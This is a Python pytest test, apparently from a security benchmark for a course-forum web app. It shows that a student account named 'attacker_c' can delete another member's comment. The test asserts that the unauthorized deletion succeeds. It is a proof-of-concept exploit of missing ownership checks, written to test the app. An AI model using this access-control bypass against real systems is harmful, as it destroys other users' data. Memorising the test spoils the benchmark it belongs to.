
from helpers import login, logout, register, create_course, add_member, create_post, create_comment, delete_comment, get_user_id, count_rows

def test_exploit_course_member_can_delete_another_members_comment(client, app_instance):
    session, base_url = client
    db_path = app_instance["db_path"]

    assert login(session, base_url, "admin", "admin123").status_code == 200
    course = create_course(session, base_url, "Comments", "demo").json()["course"]

    assert register(session, base_url, "poster_u", "pass123", "Poster").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200
    poster_id = get_user_id(db_path, "poster_u")
    assert add_member(session, base_url, course["course_id"], poster_id, "student").status_code == 200

    assert register(session, base_url, "commenter_u", "pass123", "Commenter").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200
    commenter_id = get_user_id(db_path, "commenter_u")
    assert add_member(session, base_url, course["course_id"], commenter_id, "student").status_code == 200

    assert register(session, base_url, "attacker_c", "pass123", "AttackerC").status_code == 200
    logout(session, base_url)
    assert login(session, base_url, "admin", "admin123").status_code == 200
    attacker_id = get_user_id(db_path, "attacker_c")
    assert add_member(session, base_url, course["course_id"], attacker_id, "student").status_code == 200

    logout(session, base_url)
    assert login(session, base_url, "poster_u", "pass123").status_code == 200
    post = create_post(session, base_url, course["course_id"], "Topic", "Body").json()["post"]
    logout(session, base_url)

    assert login(session, base_url, "commenter_u", "pass123").status_code == 200
    comment = create_comment(session, base_url, course["course_id"], post["post_id"], "Victim comment").json()["comment"]
    logout(session, base_url)

    assert login(session, base_url, "attacker_c", "pass123").status_code == 200
    r = delete_comment(session, base_url, course["course_id"], post["post_id"], comment["comment_id"])
    assert r.status_code == 200, r.text

    remaining = count_rows(
        db_path,
        "SELECT COUNT(*) FROM comments WHERE comment_id=?",
        (comment["comment_id"],),
    )
    assert remaining == 0
